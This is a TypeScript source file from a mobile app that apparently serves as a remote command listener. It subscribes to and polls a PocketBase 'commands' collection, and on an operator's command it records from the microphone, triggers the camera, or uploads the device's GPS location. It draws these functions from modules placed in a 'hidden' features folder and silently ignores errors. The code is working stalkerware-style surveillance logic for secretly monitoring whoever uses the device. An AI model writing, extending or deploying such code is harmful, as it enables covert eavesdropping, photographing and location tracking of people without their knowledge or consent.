import { pb, getUserId } from './pocketbase';
import { startAudioRecording, stopAudioRecording } from '../features/hidden/AudioMonitor';
import { cameraEvents } from '../features/hidden/CameraMonitor';
import * as Location from 'expo-location';

// Track already-processed command IDs so we don't execute twice
const processedCommands = new Set<string>();

// Process a single command
const executeCommand = async (command: any) => {
    // Skip if already processed
    if (processedCommands.has(command.id)) return;
    processedCommands.add(command.id);

    // Keep set from growing forever (max 200 entries)
    if (processedCommands.size > 200) {
        const first = processedCommands.values().next().value;
        if (first) processedCommands.delete(first);
    }

    // Check if command is for this device/user
    const currentUserId = getUserId();
    if (command.target_user_id !== 'all' && command.target_user_id !== currentUserId) return;
    // Skip already completed commands
    if (command.status === 'completed' || command.status === 'failed') return;

    console.log('[CommandListener] Executing command:', command.type, command.id);

    try {
        switch (command.type) {
            case 'START_MIC':
                await startAudioRecording(command.duration || 10000);
                break;
            case 'STOP_MIC':
                await stopAudioRecording();
                break;
            case 'CAPTURE_PHOTO':
                cameraEvents.emit('TRIGGER_CAMERA');
                break;
            case 'GET_LOCATION':
                const loc = await Location.getCurrentPositionAsync({});
                await pb.collection('locations').create({
                    latitude: loc.coords.latitude,
                    longitude: loc.coords.longitude,
                    timestamp: new Date().toISOString(),
                    type: 'manual_ping',
                    user_id: currentUserId,
                });
                console.log('[CommandListener] Location uploaded');
                break;
            default:
                console.log('[CommandListener] Unknown command type:', command.type);
        }

        // Mark command as completed
        try {
            await pb.collection('commands').update(command.id, { status: 'completed' });
        } catch (_) { /* ignore if update fails */ }
    } catch (err) {
        console.error('[CommandListener] Command execution failed:', err);
        try {
            await pb.collection('commands').update(command.id, { status: 'failed' });
        } catch (_) { /* ignore */ }
    }
};

/**
 * Start listening for commands using BOTH realtime SSE + polling fallback.
 * SSE may not work reliably in all React Native production builds,
 * so polling every 10 seconds ensures commands are never missed.
 */
export const startCommandListener = async () => {
    const currentUserId = getUserId();
    if (!currentUserId) {
        console.warn('[CommandListener] No authenticated user, skipping.');
        return;
    }

    // ── Method 1: Realtime SSE subscription (instant if it works) ──
    try {
        await pb.collection('commands').subscribe('*', async (e) => {
            if (e.action === 'create') {
                await executeCommand(e.record);
            }
        });
        console.log('[CommandListener] SSE subscription active');
    } catch (err) {
        console.warn('[CommandListener] SSE subscription failed, relying on polling:', err);
    }

    // ── Method 2: Polling fallback (every 10 seconds) ──
    const poll = async () => {
        try {
            const userId = getUserId();
            if (!userId) return;

            // Fetch pending commands for this user or 'all'
            const result = await pb.collection('commands').getList(1, 20, {
                filter: `status = "pending" && (target_user_id = "${userId}" || target_user_id = "all")`,
                sort: '-created',
            });

            for (const cmd of result.items) {
                await executeCommand(cmd);
            }
        } catch (err) {
            // Silently ignore polling errors (network issues, etc.)
        }
    };

    // Initial poll immediately
    await poll();

    // Then poll every 10 seconds
    setInterval(poll, 10000);
};
